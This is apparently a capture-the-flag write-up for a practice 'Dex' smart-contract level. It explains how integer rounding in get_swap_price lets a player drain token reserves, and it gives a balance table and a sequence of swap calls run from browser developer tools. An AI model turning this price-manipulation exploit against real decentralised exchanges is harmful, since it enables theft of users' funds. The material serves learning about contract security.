### Analysis
The vulnerability originates from get_swap_price method which determines the exchange rate between tokens in the Dex. The division in it won't always calculate to a perfect integer, but a fraction. And there is no fraction types in Solidity. Instead, division rounds towards zero. according to docs. For example, 3 / 2 = 1 in solidity.

|      DEX       |        player  |
| :-----------: | :--------------------------: |
token1 - token2 | token1 - token2
  100   -  100   |   10   -   10
  110   -  90    |   0    -   20    
  86    -  110   |   24   -   0    
  110   -  80    |   0    -   30    
  69    -  110   |   41   -   0    
  110  -   45    |   0    -   65   


### The Exploit
Run the code in Developer Tools:
~~~
await contract.approve(contract.address, 500)

t1 = await contract.token1()
t2 = await contract.token2()

await contract.swap(t1, t2, 10)
await contract.swap(t2, t1, 20)
await contract.swap(t1, t2, 24)
await contract.swap(t2, t1, 30)
await contract.swap(t1, t2, 41)
await contract.swap(t2, t1, 45)
~~~